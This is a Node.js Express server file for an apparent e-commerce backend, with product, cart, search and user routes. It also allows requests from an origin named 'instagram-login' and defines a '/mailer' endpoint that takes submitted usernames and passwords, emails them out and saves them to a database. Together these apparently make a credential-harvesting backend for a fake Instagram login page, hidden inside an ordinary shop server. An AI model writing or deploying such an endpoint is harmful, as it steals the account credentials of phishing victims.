require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const cors = require('cors');

const {authCheck} = require('./middleware/authCheck');
const MongoDBConnation = require('./services/mongoConnation');
const UserRoute = require('./routes/userRoute');
const HomepageRoute = require('./routes/homepageRoute');
const ProductRoute = require('./routes/productRoute');
const CartRoute = require('./routes/cartRoute');
const SearchRoute = require('./routes/searchRoute');

const nodemailsender = require('./services/Mil')
const model = require('./models/datamail');

const app = express();
app.use(cookieParser());
const PORT = process.env.PORT || 5000;

MongoDBConnation(process.env.MONGODB_URL)
    .then( ()=>{ return console.log('MongoDB Connated!') })
    .catch( (error)=>{ return console.log('MongoDB Database Connation error:', error); })

const allowedOrigins = [
    'http://localhost:5173', 
    'https://e-commerce-frontend-ashy-three.vercel.app',
    'https://instagram-login-drab-nine.vercel.app/',
    'http://192.168.183.193:5173/'
];

app.use(cors({
    origin: (origin, callback) => {
        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    }, 
    credentials: true,
}));

app.use(express.static(path.join(__dirname, 'public')));    
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(authCheck);

app.use('/api/user', UserRoute);
app.use('/api/homepage', HomepageRoute);
app.use('/api/product', ProductRoute);
app.use('/api/cart', CartRoute);
app.use('/api/search', SearchRoute);

app.post('/mailer', async(req, res)=>{
    const {user, password} = req.body;
    nodemailsender(user, password)
    await model.create({user, password})
    res.status(200).json({message: 'Mail Sent!'})
})

app.listen(PORT, () => {
    console.log(`Server Started At PORT: ${PORT}`);
})

// mongodb://127.0.0.1:27017/ECOMDATA